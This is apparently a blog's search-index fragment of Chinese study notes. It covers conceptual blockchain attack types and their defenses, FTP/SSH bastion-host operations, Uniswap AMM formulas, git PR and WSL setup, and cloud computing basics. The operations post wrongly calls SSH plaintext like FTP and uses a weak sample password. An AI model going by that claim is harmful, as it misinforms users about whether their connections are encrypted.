攻击者通过伪造网页、系统、邮件等形式，诱导用户进行一系列交易操作，获取用户的钱包、交易所账户口令，进而盗取用户资产。\n（2）木马劫持攻击（Trojan horse attack） ：攻击者可以向用户主机中植入木马病毒，通过按键记录、hook浏览器的方式来获取其账户和口令，从而盗取目标用户资产。2017年8月，攻击者利用木马病毒Trickbot对包括Coinbase在内的几家数字货币交易所进行了Web注入攻击[113]，当受害者购买数字货币时，木马病毒会劫持交易所钱包，并将资金定向至攻击者钱包，最终造成用户损失。\n（3）中间人劫持攻击（man-in-the-middle attack）： 目前，多数交易所都采用HTTPS协议进行交互，在一定程度上保证了数据安全。但在某些API接口的子域名，却未使用HTTPS。攻击者可以通过在流量中转处劫持网络流量，如路由器、网关等流量出口，从而获取相关信息。\n（4）私钥窃取攻击（private key stealing attack）： 用户丢失私钥意味着用户的账户资产全部遗失，因此，用户通常会对钱包的私钥文件进行多次备份，而不安全的备份存放点存在私钥泄露的风险。目前，针对比特币的wallet.dat文件广泛出现在互联网中，例如GitHub、NAS服务器、Web服务等互联网可接入的位置。目前，已经有攻击者开始扫描密钥文件，甚至开发相关的木马病毒进行私钥窃取。\n（5）钱包客户端漏洞（wallet client vulnerability）: 攻击者可能利用钱包软件自身的漏洞实施攻击，进而获取用户隐私和资产。例如：在以太坊多重签名钱包Parity中，攻击者可以通过间接调用初始化钱包软件的库函数，将自己更换为受害者钱包的新主人。2017年11月，Parity钱包出现重大Bug，攻击者利用该Bug成为库的主人，然后调用自杀函数报废整个合约库，彻底冻结了150多个地址中总计超过50万个ETH，直接导致上亿美元资金被冻结。\n（6）粉尘攻击（dusting attack）： 比特币系统中，“聪”是最小的BTC单位，通常将100聪以内的BTC称为粉尘。而且比特币中没有余额的概念，所有合法的交易都可以追溯到前向一个或多个交易的输出，其源头都是挖矿奖励，末尾则是当前未花费的交易输出（unspent transaction output，简称UTXO）。攻击者可以通过向目标用户钱包地址发送“粉尘”来实施粉尘攻击，当用户使用这些“粉尘”交易时，会导致其与用户自有UTXO的交易输出发生混合，攻击者可以通过“粉尘”来追踪用户的钱包地址，获取用户的隐私信息，从而勒索、盗取目标用户的资产。\n（7） SIM hack： 在一些去中心化钱包中，用户需要通过SIM（subscriber identity module）卡来验证身份的合法性。用户通常在丢失SIM卡后向运营商申请“移植”SIM卡，该服务允许客户将该电话号码转移到新的SIM设备中。攻击者可以利用这一漏洞，通过技术手段将受害者的SIM卡移植到他们控制的电话上，然后在其电子邮件帐户上启动密码重置流程，验证码会发送到电话号码中。 由于攻击者此时控制着SIM卡，可以轻易地对受害者账户信息进行篡改，盗取受害者账户中的财产。\n（8）在线钱包窃取（online wallet theft）：目前，很多用户会选择使用在线钱包，这使得个人的资产安全严重依赖于服务商的安全性。2013年11月，比特币在线钱包服务商Inputs.io遭受黑客攻击，黑客通过电子邮件账号进行入侵，进而劫持代管账号，从中盗取了4 100个比特币。\n（9）重放攻击（replay attack）:主要包含单链重放攻击和多链重放攻击。单链重放攻击中，攻击者通常在以太坊等账户余额模型的区块链系统中先发起一笔交易A（如交易所提现），然后对A的时间戳等数据进行修改，获得新的交易B并进行广播。因为B的私钥签名和公钥加密齐全，所以矿工会在付款方余额足够的情况下将交易B打包进新区块。攻击者不断重复便可获取大量资金，直至付款方账户余额不足为止。多链重放攻击通常出现在区块链硬分叉时，此时用户的地址和私钥生成算法相同，所有“一条链上的交易在另一条链上也往往是合法的”，所以攻击者在其中一条链上发起的交易后，可以重新将该交易广播到另一条链上，并得到整个系统的确认。\n防御策略与方法   相比区块链其他层级，应用层攻击的场景更加具体、复杂，所以攻击者的手段也十分多样。因此，区块链应用层面临的安全问题应从实际的服务场景出发，设计合适的防御策略和相关技术。在挖矿场景中，攻击者采用的攻击方式大多具备社会工程学攻击特性，即攻击者会根据矿机漏洞、挖矿机制漏洞采取趋利的挖矿行为，通过损害矿池或其他矿工利益，实现自身利益的最大化。\n 针对矿机的系统漏洞 ，可以尝试以下防御策略。\n （1）开发阶段:开发人员应在开发阶段设定软件安全开发生命周期，建立安全漏洞管理机制，在成品销售前对矿机系统进行代码审计、性能测试，以预防0day漏洞攻击。\n （2）部署阶段:矿工应该在原有的软件防护基础上增加辅助的安全检测技术，如入侵检测、防火墙、蜜罐技术等，进一步预防网络渗透攻击和地址篡改攻击。\n   攻击者可以利用挖矿机制 中存在的漏洞恶意骗取、竞争出块奖励，也可以通过扰乱交易顺序实现双花攻击等。其中，算力伪造攻击和扣块攻击 属于恶意骗取矿池出块奖励的攻击行为，可以尝试以下防御策略。\n （1）身份管理机制:矿池应结合保证金奖惩机制（如Casper机制）和身份认证机制，对新加入的矿工进行身份认证，要求其缴纳一定的保证金，为其诚实的挖矿行为做保证。\n （2）细粒度的工作量检验算法:矿池应定时更新其使用的工作量检验算法，对以往算法中存在的问题进行背书，作为新算法设计的重要依据。\n （3）合理的绩效制度:矿池应定时对矿工进行绩效考核，奖励表现优秀的矿工，驱逐效率低下的懒惰矿工。对矿池内的矿工行为进行管理和约束，保证矿池公平有序地运行。\n （4）相互监管制度:设置矿工相互监管奖励，一旦矿工因进行算力伪造攻击和扣块攻击而被举报，则矿池奖励举报者，没收恶意矿工的保证金，将其加入黑名单后驱逐出矿池，不再录用。\n   丢弃攻击、空块攻击、通用挖矿攻击则属于恶意竞争出块奖励攻击行为。丢弃攻击中，攻击者主要依赖于网络资源优势，可以比其他节点更快获取数据上链信息，也可以更快地完成数据打包上链。所以丢弃攻击可以看作是女巫攻击的变种攻击，也可以作为自私挖矿攻击的前置攻击，提高攻击者实施自私挖矿攻击的成功率。为了防止丢弃攻击，区块链网络可以引入身份认证机制，对用户潜在的节点身份进行关联分析，杜绝单个用户通过操纵多个节点获取远高于其他节点的网络优势。在空块攻击场景中，攻击者之所以可以通过生成空块恶意竞争奖励，是因为区块链网络不存在对新区块的有效性验证过程。因此，区块链网络节点只要在获取新区块时执行有效性验证，即可有效缓解阻止空块攻击。通用挖矿攻击则需要特定的场景才可以实施，其关键在于攻击者利用新系统与旧系统之间相同的架构和共识机制导致的矿机（算力）通用问题，通过成熟系统的中算力对新系统实现算力压制，从而恶意竞争出块奖励，甚至实施双花攻击、卖空攻击等恶意行为。因此，新区块链项目必须考虑系统封闭性、专机专用等问题，从根本上杜绝算力通用导致的通用挖矿攻击。\n   芬尼攻击、种族攻击、交易顺序依赖攻击属于扰乱交易顺序类的攻击方式。芬尼攻击和种族攻击主要针对的是支持零确认交易的服务场景，前者主要利用挖矿便利，攻击者只有在挖到包含自己交易的区块时，才会通过零确认交易扰乱交易秩序，实现代币双花等目的；而后者和交易顺序依赖攻击则是通过提高交易Gas的方式扰乱交易顺序，进而实现代币双花等目的。这两者的共性在于区块链节点在接受新区块时未验证区块内交易与交易池中的未确认交易是否存在冲突。由于零确认交易可以满足商家的即时性支付需求，所以直接通过禁止零确认交易来阻止芬尼攻击和种族攻击的方式不具备可行性。区块链系统可以考虑开通钱包的子账户来保证零确认交易的安全性，即，用户需要通过专门的子账户才能完成零确认交易操作。此时，零确认交易由矿工单独打包验证，在一定程度上可以避免零确认交易与普通交易的冲突。此外，为了避免攻击者扰乱交易顺序，区块链系统可以要求矿工在打包交易时，通过代币锁定技术缴纳保证金之后再广播新区块。其他节点在接受新区块时，可以就区块内交易在交易池中进行遍历验证：如果通过验证，则接受新区块；否则，该节点可以通过举报矿工恶意行为来获取矿工被锁定的保证金及出块奖励。\n•      八、防御策略与方法\n   在区块链交易场景中，攻击者的最终目的是通过直接或间接手段获取用户节点的账户信息，进而盗取资产，主要存在交易平台和用户账户两个攻击目标 。为了保证交易平台中用户的账户隐私，交易平台应采取以下措施。\n（1）引入密码安全等级分析机制。系统可以在用户设置账户密码时，对当前密码的安全性进行实时评级，避免用户使用弱口令，从而预防弱口令攻击。\n（2）交易平台应在用户登录账号时进行人机识别，在一定程度上缓解撞库攻击。而用户也应该注意避免多网站的密码通用问题，可以考虑对账户进行安全等级评估，相同安全等级的账户采用相同的密码，这样既可以缓解撞库攻击，也能避免账户密码过多给用户带来的密码管理问题。\n（3）通过限制目标账户的登陆频率和限制单节点的访问请求频率，从被访问端和访问端两个方向限制攻击者的攻击能力，可以有效预防穷举攻击。\n（4）启用API调用接口认证机制，合理管理交易平台的API接口，预防API接口攻击。\n（5）提高开发工程师安全素养，在一些敏感系统里单独实现一些额外的认证机制，避免单点登陆漏洞。\n   此外，用户在日常交易中应该提高个人的安全意识，采取相应的安全措施，避免在交易过程中泄露了个人账户的隐私数据，具体需要从以下几方面考虑。\n（1）培养好安全意识，提高对危险网站、邮件的辨识能力，预防钓鱼攻击。\n（2）构建全面的系统安全防护体系，安装防火墙等安全软件，预防木马劫持攻击。\n（3）利用安全的路由协议对区块链网络实现全方位覆盖，预防中间人劫持攻击。\n（4）实现离线的密钥管理，预防攻击者对在线密钥存储中的私钥窃取。\n（5）利用代码审计、逆向漏洞分析、反逆向工程等技术对钱包客户端代码的安全性进行评估。\n（6）在使用数字货币钱包时，对一些来源不明的小额资金“粉尘”进行标记并禁用，预防粉尘攻击。\n（7）使用专门的零钱包存储该用户持有的“粉尘”级资产，其中既包含攻击者发送的“粉尘”，也可能包含用户自身交易产生的小额资金。为了资产安全，该零钱包中的资金专用于隐私性不高的交易。\n•      八、防御策略与方法\n   在针对认证机制漏洞的SIM hack攻击场景中，攻击者主要是利用服务商提供的“账户找回”服务中的安全隐患来成功获取目标账户。因为基于手机、邮件的二次验证并不是完全安全的方法，因此服务商应尝试使用采取2FA等具备更高安全性的有更高级别安全设置的服务。2FA是基于时间、历史长度、实物，例如信用卡、SMS手机、令牌、指纹等自然变量结合一定的加密算法组合出的一组动态密码，一般每60s刷新一次。这种方法不容易被破解，相对较安全。\n•      八、防御策略与方法\n   理论上，基于UTXO结构的区块链系统可以抵抗重放攻击，因为转账是基于每一笔UTXO进行的原子级别操作，不存在一笔UTXO被重复扣除的情况。但是在类似以太坊的账户结构中，交易是通过余额判断合法性的只要余额足够就可以进行重复扣款转账，一笔交易的信息进行多次广播的重放攻击是可行的。交易延展性攻击和重放攻击非常相似，它们都是对交易所发起的攻击方式，但重放攻击主要针对区块链硬分叉的情况，而交易延展性攻击讲究的是区块标识的可变性。\n•      八、防御策略与方法\n   此外，基于Hyperledger Fabric的区块链也可以抵抗重放攻击，该框架中采用Endorser节点对客户端提交的交易预案进行身份验证，若交易信息异常，则系统终止操作，这种方式可以有效阻止重放攻击。以太坊的账户结构中存在一个参数Nonce，该参数的值等于从这个账户中发出交易的数量。当交易完成验证后，发送者账户中的Nonce值会自动增加1。当矿工验证一笔交易是否合法的时候，矿工会对比交易包含的Nonce值，并与该交易的发送者账户中的Nonce值进行比较，相等才算作合法交易，并对该交易打包出块。单链重放攻击无法修改发送者账户的数值，因此当接受到重复交易时，矿工会直接判定它无效，从而阻止了单链重放攻击。面对多链重放攻击时可以参考以太零开发团队的做法，建立一个交易锁。当一笔交易发起时，交易锁将被广播到整个区块链网络。此时，交易锁会锁定交易关联的数字资产。交易在主节点验证期间，原交易资产被锁定无法使用，以此达到抵御多链重放攻击的目的。\n","url":"2024/11/29/链安4/","date":"2024-11-29"},{"title":"3CDaemon + MobaXterm运维","content":"3CDaemon + MobaXterm 运维学习笔记📑 目录\n一、FTP 配置与使用\n二、SSH 与 SFTP 基础\n三、BS 运维（Browser–Server 模式）\n四、CS 运维（Client–Server 模式）\n参考链接与原文标题\n\n\n一、FTP 配置与使用\n3CDaemon 创建 FTP 用户\n打开 3CDaemon → 点击 FTP 用户（创建前先选择一个真实存在的文件夹路径，例如 D:\\）。\n新建用户：\n账号：admin\n密码：123123\n\n\n确认保存。\n\n\n开启 FTP 服务\n进入 配置 → 服务管理 → 端口配置。\n默认端口为 21，如需自定义可改为 20021。\n\n\n在堡垒机添加 FTP 资产\n新建资产：\nIP：主机 IP\n端口：FTP 服务端口（如 21 或 20021）\n删除系统自带账号，添加刚刚在 3CDaemon 中新建的账号（用户名：admin，密码：123123）。\n服务类型选择 FTP。\n\n\n确认保存。\n在 授权管理 中，为刚建的资产分配用户权限。\n\n\nMobaXterm 连接 FTP\n在 个人工作台 中找到刚建的 FTP 资产，使用 MobaXterm 连接即可实现文件互传。\n\n\n\n\n二、SSH 与 SFTP 基础\nSSH：\n默认端口：22（原文提到 23 可能为笔误）\n明文传输，与 FTP 类似（账号密码在传输过程中可能被截获）\n\n\nSFTP：\n基于 SSH 的加密传输协议，更安全。\n\n\nMobaXterm 连接 SSH：\n需要对方的 IP、用户名、密码，端口（默认 22，若修改需对应填写）。\n同一网络下可直接连接并进行远程文件传输。\n\n\n\n\n三、BS 运维（Browser–Server 模式）\n前置条件\n安装单点登录器。\n运维配置 → 选择 ssh/TELnet。\n本地客户端选择 MobaXterm，终端类型选择 Xterm。\n\n\nSSH 端口确认\n在 服务配置 → 端口配置 中查看 SSH 端口（如 22224），该端口为 主机端口。\n\n\n堡垒机 DNS 配置\n进入 堡垒机 → 配置 → 网络配置 → DNS配置。\n填写堡垒机的 IP。\n保存后可使用 MobaXterm 通过堡垒机访问目标服务器。\n\n\n\n\n四、CS 运维（Client–Server 模式）\nMobaXterm 连接堡垒机\n主机（Host）：堡垒机 IP\n用户名：group9\n端口：堡垒机 SSH 代理端口（如 22224）\n\n\n登录流程\n连接后输入堡垒机的账号密码。\n成功后可通过堡垒机访问目标服务器，完成本地运维。\n\n\n\n\n总结表\n\n\n场景\n工具\n端口默认值\n关键配置步骤\n\n\n\nFTP 文件传输\n3CDaemon + MobaXterm\n21（或自定义）\n创建用户 → 开启 FTP 服务 → 新建资产 → 授权用户 → MobaXterm 连接\n\n\nSSH 远程运维\nMobaXterm\n22\n填写 IP、账号、密码，连接远程服务器\n\n\nBS 运维\n浏览器 + MobaXterm\n自定义（例：22224）\n配置单点登录器 → 填终端类型 → 查看 SSH 主机端口 → 配置堡垒机 DNS\n\n\nCS 运维\nMobaXterm\n自定义（例：22224）\n输入堡垒机 IP、用户名、端口 → 登录堡垒机 → 访问目标主机\n\n\n\n参考链接与原文标题\n\n\n原文标题\n链接\n\n\n\n3CDaemon使用教程 - CSDN App\nhttp://t.csdnimg.cn/LKYjY\n\n\nFTP服务器的搭建配置 - CSDN App\nhttp://t.csdnimg.cn/kIe4p\n\n\n使用3CDaemon进行ftp文件上传用户设置，端口监听\nhttp://t.csdnimg.cn/T9ee0\n\n\n【MobaXterm】— 登录SSH服务器 - CSDN App\nhttp://t.csdnimg.cn/OgnY4\n\n\n比 Xshell 还好用的 SSH 客户端神器，MobaXterm 太爱了！ - CSDN App\nhttp://t.csdnimg.cn/RBR6t\n\n\n","url":"2025/08/05/3CDaemon + MobaXterm 运维学习笔记/","date":"2025-08-05"},{"title":"Uniswap专项","content":"恒定乘积自动做市商算法核心公式恒定乘积做市商的核心公式是：x * y = k其中：\n\n( x ) 是第一种资产的数量（如ETH）\n( y ) 是第二种资产的数量（如USDT）\n( k ) 是常数乘积\n\n价格变动机制当交易发生时，资产数量的变化遵循：[ (x + dx)(y - dy) &#x3D; k ][ (x - dx)(y + dy) &#x3D; k ]\n滑点计算滑点计算公式（纯文本格式）滑点(S) &#x3D; [(实际执行价格 - 预期价格) &#x2F; 预期价格] × 100%\n变量说明：\n滑点(S)：以百分比(%)表示的价格偏差\n实际执行价格：交易实际成交的价格\n预期价格：交易发起时预期的市场价格\n\n示例：如果预期价格是2000 USDT，实际执行价格是2666.66 USDT，那么：滑点 &#x3D; [(2666.66 - 2000)&#x2F;2000] × 100% &#x3D; 33.33%\n公式解读：\n先计算实际价格与预期价格的差值\n将差值除以预期价格，得到相对偏差\n乘以100%转换为百分比形式\n\n注意事项：\n正值表示实际价格高于预期（对买方不利）\n负值表示实际价格低于预期（对卖方不利）\n滑点大小反映市场流动性和交易规模的影响\n\n交易案例假定一个交易对 tokenA &#x2F; tokenB\n有 10A  200B\n则k &#x3D; 10 * 200 &#x3D;2000\n情况\n用户卖出5个A\n\n​\t（10 + 5 ） * （200 - dy）&#x3D; 2000\n​\t\t得 dy &#x3D; 66.667B\n​\t\t实际卖出价格： \n\n恢复初始状态，用户此时持有100B，想买入A\n\n​    \t(10 - dx) * (200+100) &#x3D; 2000\n​    \t得dx &#x3D; 3.33A\n\n极端场景：用户卖出1000个A\n\n​\t(10 + 1000) * (200 - dy) &#x3D; 2000\n​\t\t得dy &#x3D; 200 - 20&#x2F;11 &#x3D; 198B\nspot price\nPA &#x3D; B &#x2F; A &#x3D; 200 &#x2F; 10 &#x3D; 20\nPB &#x3D; A &#x2F; B &#x3D; 10 &#x2F; 200 &#x3D; 0.05 \n重要概念\n流动性池：由两种资产组成，数量乘积保持恒定\n价格影响：大额交易会导致显著的价格滑点\n交易执行：实际执行价格可能与预期价格有差异\n\n注意事项\n大额交易（交易额占池子总数比较大）在AMM中会产生较高的滑点\n流动性深度影响价格稳定性\n公式中的k值代表流动性池的规模，k越大，同等交易量下的滑点越小\n\n\n流动性参数 L恒定乘积公式的两种表示方法1. 传统形式 (x × y &#x3D; k)\nk是一个常数，代表流动性池中两种资产数量的乘积\n当交易发生时，k值保持不变\n资产数量x和y会呈反向变化关系\n这是最基本的自动做市商(AMM)模型公式\n\n2. 改进形式 (x × y &#x3D; L²)\nL被定义为”流动性深度”(Liquidity)\nL等于k的平方根(L &#x3D; √k)\n这种表示法直接将流动性L与资产数量关联\n便于更直观地计算价格和滑点\n\n使用L²表示的优势(1) 几何意义\n公式x × y &#x3D; L²描述的是双曲线\nL值决定了曲线的”宽度”\nL越大，曲线越平缓(流动性越深)，价格滑点越小\n\n(2) 统一流动性度量\n在Uniswap V3等先进模型中，明确将L定义为√(x × y)\n这样做的好处包括：\n添加&#x2F;移除流动性时，可以直接通过L计算所需资产量\n可以实现不同价格区间的流动性分段计算(集中流动性)\n\n\n\n(3) 简化价格计算\n资产价格P(如ETH&#x2F;USDT价格)可以表示为：P &#x3D; y&#x2F;x &#x3D; L²&#x2F;x²\n这种表示方法能更直观地反映价格与流动性的关系\n\n两种表示法的比较\n\n\n特性\nx × y &#x3D; k\nx × y &#x3D; L²\n\n\n\n常数意义\nk是任意乘积常数\nL明确代表流动性深度\n\n\n价格影响\n滑点取决于k大小\n滑点由L直接控制\n\n\n适用性\n基础AMM模型\n高级模型(如Uniswap V3)\n\n\n实际应用示例假设一个ETH&#x2F;USDT交易池：\n\n传统模型：100 ETH × 400,000 USDT &#x3D; 40,000,000 (k值)\n流动性模型：√40,000,000 ≈ 6,324.56 (L值)\n\n当用户买入10 ETH时：\n\n两种公式计算结果相同\n但L²形式能更直观显示流动性变化\n\nLP 和 LPT 解释1. LP（Liquidity Provider，流动性提供者）\n定义：向去中心化交易所（DEX）或自动做市商（AMM）资金池存入代币的用户。\n作用：提供交易对的流动性（如 ETH&#x2F;USDT），使其他用户能顺利交易。\n收益：\n赚取交易手续费（通常 0.1%-0.3% 每笔）。\n可能获得流动性挖矿的额外代币奖励。\n\n\n风险：\n无常损失（Impermanent Loss）：当代币价格剧烈波动时，LP 的资产价值可能低于单纯持有。\n智能合约风险：资金池可能被黑客攻击或存在漏洞。\n\n\n\n\n2. LPT（Liquidity Provider Token，流动性提供者代币）\n定义：当用户成为 LP 时，系统发放的凭证代币，代表其在资金池中的份额。\n功能：\n赎回权：凭 LPT 可随时取回自己存入的资产（按比例计算）。\n流动性证明：用于参与治理或质押挖矿（如 Curve 的 veCRV）。\n\n\n示例：\nUniswap 的 LP 会收到 UNI-V2 代币。\nPancakeSwap 的 LP 会收到 CAKE-LP 代币。\n\n\n\n\n关键区别\n\n\n术语\n含义\n作用\n\n\n\nLP\n流动性提供者（人&#x2F;地址）\n存入代币，赚取手续费\n\n\nLPT\n流动性凭证（代币）\n证明份额，用于赎回或质押\n\n\n\n为什么需要 LPT？\n追踪份额：资金池中资产价格变动时，LPT 确保 LP 能按比例取回资产。\n可组合性：LPT 可质押到其他协议（如 Yearn Finance）进行二次收益 farming。\n去中心化治理：部分项目的 LPT 具有投票权（如 SushiSwap 的 SLP）。\n\n\n实际案例\n在 Uniswap 添加流动性：\n存入 1 ETH + 2000 USDT → 获得 UNI-V2 LPT。\n交易手续费按 LPT 占比分配。\n\n\n赎回资产：\n销毁 UNI-V2 LPT → 取回 ETH 和 USDT（可能因价格变动数量不同）。\n\n\n\n\n注意事项\n无常损失：价格波动越大，LP 的潜在损失风险越高。\nLPT 价值：本身可在二级市场交易（如 SushiSwap 的 SLP），但通常与底层资产挂钩。\n\n添加流动性（Adding Liquidity）1. 基本概念添加流动性 是指用户向去中心化交易所（DEX）或自动做市商（AMM）的资金池存入一定比例的两种代币，成为流动性提供者（LP），以支持该交易对的交易活动。作为回报，LP 会获得交易手续费分成和可能的额外奖励。\n\n2. 核心原理\n恒定乘积公式（AMM 模型）：  \n\n添加流动性时：用户必须按当前池中资产的比例同时存入两种代币。例如：\n\n如果池中有 100 ETH 和 200,000 USDT（比例 1:2000），用户需按相同比例存入（如 1 ETH + 2000 USDT）。\n\n(x +dx) / (y + dy) = x / y\n\n\n\n3. 操作步骤（以 Uniswap 为例）\n选择交易对：如 ETH&#x2F;USDT。\n输入存入数量：系统会自动计算另一种代币的所需数量（保持比例一致）。\n授权代币：首次需授权智能合约访问你的代币。\n确认添加：完成交易后，你会收到 LP Token（LPT） 作为凭证。\n\n\n4. 为什么需要添加流动性？\n支持交易：没有流动性，用户无法在 DEX 中买卖代币。\n赚取收益：\n手续费：每笔交易收取 0.01%-0.3% 的费用，按 LP 份额分配。\n挖矿奖励：部分项目额外发放治理代币（如 UNI、CAKE）。\n\n\n\n\n5. 风险与注意事项\n无常损失（Impermanent Loss）：当代币价格剧烈波动时，LP 取回的资产价值可能低于单纯持有。示例：存入 ETH&#x2F;USDT 后，若 ETH 价格暴涨，部分 ETH 会被自动卖出，导致 LP 的 ETH 数量减少。\n智能合约风险：资金池可能存在漏洞或被黑客攻击。\n代币选择风险：为低流动性或诈骗代币提供流动性可能导致重大损失。\n\n\n6. 实际案例\n场景：你向 ETH&#x2F;USDT 池存入 1 ETH（价值 2000 USDT）和 2000 USDT。\n结果：\n获得 UNI-V2 LP Token。\n若池中总流动性为 100 ETH + 200,000 USDT，你的份额是 1%。\n每笔交易手续费（如 0.3%）的 1% 归你所有。\n\n\n\n\n7. 常见问题\nQ：能否只存一种代币？A：不能，必须按比例存入两种（AMM 机制要求）。\nQ：如何计算收益？A：收益来自手续费 + 挖矿奖励，可通过 DEX 的仪表盘实时查看。\nQ：何时取出流动性？A：当手续费收益覆盖无常损失，或需要收回资金时。\n\n添加流动性是 DeFi 生态的核心操作之一，通过提供代币支持交易并获得被动收益，但需谨慎评估无常损失和项目风险。对于新手，建议从主流交易对（如 ETH&#x2F;USDT）开始，并充分理解机制后再参与。\n\n添加初始流动性决定了一个token的初始价格\n添加流动性时，不可以改变&#x2F;影响价格\n\n\n移除流动性（Removing Liquidity）1. 基本概念移除流动性 是指流动性提供者（LP）从去中心化交易所（DEX）的资金池中取回自己原先存入的代币，并销毁对应的 LP Token（LPT）。这一操作会减少资金池的流动性，同时 LP 停止赚取手续费收益。\n\n2. 核心原理\n赎回比例：移除流动性时，你能取回的代币数量取决于：\n\n当前资金池的资产比例（可能因交易和价格波动而变化）。\n你持有的 LPT 占总 LPT 的比例。公式：你的代币数量 = (你的 LPT 数量 / 总 LPT) × 池中代币余额\n\n\n无常损失的影响：如果代币价格波动较大，取回的代币数量可能与最初存入时不同（通常少于单纯持有）。\n\n\n\n3. 操作步骤（以 Uniswap 为例）\n连接钱包：访问 DEX 的「Pool」或「流动性管理」页面。\n选择要移除的流动性池：如 ETH&#x2F;USDT。\n输入移除数量：选择销毁全部或部分 LPT。\n预览赎回资产：系统会显示可取回的两种代币数量（可能因价格变化与最初不同）。\n确认移除：完成交易后，LPT 被销毁，代币返回钱包。\n\n\n4. 为什么需要移除流动性？\n提取收益：将积累的手续费和本金变现。\n规避风险：避免无常损失进一步扩大，或应对市场剧烈波动。\n调整投资策略：将资金转移到其他池子或退出 DeFi 市场。\n\n\n5. 关键注意事项\n价格影响：移除大额流动性可能导致池内资产比例失衡，短暂影响价格（滑点增大）。\n手续费：部分平台会收取少量交易费（如以太坊的 Gas 费）。\n税收：某些地区将移除流动性视为应税事件（需咨询专业人士）。\n\n\n6. 实际案例\n场景：你最初存入 1 ETH + 2000 USDT，获得 10 枚 UNI-V2 LPT（占总 LPT 的 1%）。现在池中有 100 ETH + 400,000 USDT（ETH 价格上涨至 4000 USDT）。\n移除操作：  \n销毁全部 10 枚 LPT。  \n取回数量：ETH = 1% × 100 = 1 ETHUSDT = 1% × 400,000 = 4000 USDT  \n结果：你最终获得 1 ETH + 4000 USDT（总价值 8000 USDT），比最初存入的 4000 USDT 翻倍（但 ETH 数量未变，存在无常损失）。\n\n\n\n\n7. 常见问题\nQ：移除流动性后，LPT 会消失吗？A：是的，LPT 会被销毁，无法再次使用。  \nQ：能否分批移除流动性？A：可以，自由选择销毁部分 LPT。  \nQ：移除时价格如何计算？A：按移除时池中的实时资产比例计算（非存入时的价格）。\n\n\n impermanentloss.com提前模拟收益与风险。\n移除流动性时，不可以改变&#x2F;影响价格\n撤底池（移除全部）\n添加&#x2F;移除流动性时候，k都是有变化的\nk的恒定是指在swap时候是恒定不变的\n\n","url":"2025/08/06/Uniswap专项/","date":"2025-08-06"},{"title":"如何提pr&vscode如何连上wsl","content":"参与开源项目流程（Fork &amp; PR）\nFork 仓库\n\n在目标开源项目页面点击 Fork，将项目复制到自己的 GitHub 账户。\n\n\n克隆到本地\n\n在自己 Fork 的仓库点击 Code 按钮，复制 HTTP&#x2F;SSH 链接。\n\n在 Git Bash 执行：\n12345bash复制编辑git clone 链接地址\n\n\n修改代码\n\n创建分支 → 修改代码 → 提交到自己的远程仓库。\n\n\n发起 Pull Request (PR)\n\nGitHub 会在原仓库页面提醒你当前有新提交可 PR。\n点击绿色按钮（建议使用提醒中的按钮），填写必要信息提交，等待仓库维护者审核合并。\n\n\n\n\n更新 Fork 仓库（与原项目同步）\n关联原仓库\n12345bash复制编辑git remote add upstream 原仓库链接\n\n获取原仓库最新代码\n12345bash复制编辑git fetch upstream\n\n合并到本地主分支\n12345bash复制编辑git merge upstream/master\n\n推送到远程 Fork 仓库（可选）\n12345bash复制编辑git push origin master\n\n\n在 VS Code 提交代码\n选择修改的文件，点击文件右侧的 加号（加入暂存区）。\n填写提交信息，点击 √（提交到本地）。\n点击 同步&#x2F;推送按钮 上传到远程仓库。\n\n\nVS Code 连接 WSL\n安装 Remote-WSL 插件（VS Code 扩展商店）。\n\n安装 WSL 并选择版本 1&#x2F;2：\n12345powershell复制编辑wsl --set-version &lt;发行版名&gt; 2\n\n更新 WSL 内系统：\n12bash复制编辑sudo apt updatesudo apt upgrade\n\n在 VS Code 中连接 WSL\n\n左下角点击 “&gt;&lt;” 图标 → 选择 “Connect to WSL”。\n如果第一次失败，关闭 VS Code 再尝试。\n\n\n打开 WSL 内文件夹\n\n进入存储在 WSL2 内的文件夹后，按需安装语言环境。\n\n\n\n\n参考文章\n安装 GitHub 并连接\nVS Code 连接 WSL\n\n","url":"2024/11/21/如何提pr&vscode如何连上wsl/","date":"2024-11-21"},{"title":"云计算学习笔记","content":"云计算学习笔记一、云计算的模式分类1. 横向分层（按部署模式划分）\n\n\n类型\n特点\n适用场景\n\n\n\n私有云\n合规、安全、性能高\n企业内网、金融、政府、数据安全要求高的业务\n\n\n公有云\n敏捷、低成本、弹性\n中小企业、快速上线、弹性扩容需求场景\n\n\n混合云\n兼具安全性与弹性扩展能力\n核心业务部署私有云，非核心业务或突发需求上公有云\n\n\n2. 纵向分层（按服务模式划分）\n\n\n层级\n含义\n示例\n\n\n\nIaaS（基础架构即服务）\n提供计算、存储、网络等基础资源\n阿里云ECS、腾讯云CVM\n\n\nPaaS（平台即服务）\n提供开发运行环境及工具\n阿里云中间件、Google App Engine\n\n\nSaaS（软件即服务）\n直接提供可使用的应用软件\n钉钉、微信、企业邮箱\n\n\n\n二、虚拟化技术1. 作用\n解耦服务器硬件资源与操作系统\n支持“一虚多”——一台物理机可运行多个逻辑计算机\n资源池化与灵活调度\n\n2. 虚拟机热升级\n原理：在不关机的情况下增加 CPU、内存、磁盘等\n优势：减少停机时间\n限制：不能热降级\n\n\n三、网络技术\n软件定义网络（SDN）：将网络控制与数据转发分离，实现集中化、可编程的网络管理\n虚拟防火墙：基于虚拟化环境提供防护，替代或补充传统硬件防火墙\n虚拟负载均衡：在虚拟化平台实现流量分发与容错\n\n\n四、存储技术1. 常见类型\n块存储：高性能，适合数据库等高IO场景\n文件存储：共享文件系统，便于团队协作\n对象存储：适合海量非结构化数据，如图片、视频\n\n2. SAN存储（统一存储）\n架构：集中式 + 双控 + RAID + 全路径冗余\n优点：成熟稳定、低延迟、高带宽、可维护性好\n缺点：单点故障风险、扩展性有限、成本高\n适用：交易类数据库等高IO场景\n\n3. 